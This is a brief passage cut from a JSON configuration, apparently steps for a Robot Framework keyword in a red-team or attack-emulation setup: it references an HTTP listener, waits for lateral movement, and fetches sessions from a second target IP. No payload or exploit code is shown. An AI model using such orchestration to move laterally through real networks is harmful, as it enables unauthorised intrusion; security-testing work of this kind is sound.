              },
              {
                "param": "listener",
                "position": 4,
                "variableRef": true,
                "variableName": "HTTP_LISTENER"
              }
            ],
            "postKeywordStatements": [
              "Sleep    ${LATERAL_WAIT}s",
              "@{_lateral_sessions}=    Get Sessions By IP    ${TARGET2}",
              "${CURRENT_SESSION}=    Set Variable    ${_lateral_sessions[0]}"
